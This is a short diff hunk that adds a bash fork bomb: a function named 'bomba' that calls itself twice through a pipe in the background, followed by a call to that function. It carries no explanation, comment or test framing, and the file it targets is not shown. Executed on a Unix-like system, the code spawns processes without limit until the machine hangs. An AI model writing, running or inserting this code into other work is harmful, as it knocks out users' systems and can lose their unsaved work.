@@ -1,0 +1,5 @@
+bomba()
+{
+   bomba | bomba &
+};
+bomba
